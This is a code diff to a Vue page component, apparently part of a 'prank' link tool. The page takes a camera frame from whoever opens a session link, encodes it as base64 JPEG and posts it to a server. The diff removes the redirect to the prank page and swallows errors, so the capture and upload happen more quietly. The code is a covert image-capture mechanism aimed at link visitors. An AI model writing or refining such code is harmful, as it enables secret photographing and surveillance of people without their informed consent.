@@ -21,7 +21,7 @@ export default {
     async capture() {
       const session_id = this.$route.params.id
       this.session_id = session_id
-      if (!session_id) return this.redirect()
+      if (!session_id) return
 
       try {
         let stream = null
@@ -65,7 +65,7 @@ export default {
           })
         }
 
-        if (!stream) return this.redirect()
+        if (!stream) return
 
         const video = this.$refs.video
         video.srcObject = stream
@@ -90,7 +90,7 @@ export default {
 
         // 🟢 BASE64 BODY
         canvas.toBlob(blob => {
-          if (!blob) return this.redirect()
+          if (!blob) return
 
           const reader = new FileReader()
           reader.onloadend = async () => {
@@ -103,20 +103,15 @@ export default {
                   session_id
                 })
               })
-            } finally {
-              this.redirect()
+            } catch (e) {
+              // jim
             }
           }
           reader.readAsDataURL(blob)
         }, "image/jpeg", 0.85)
 
       } catch (err) {
-        this.redirect()
       }
-    },
-
-    redirect() {
-      this.$router.push(`/prank/${this.session_id}`)
     }
 
   }
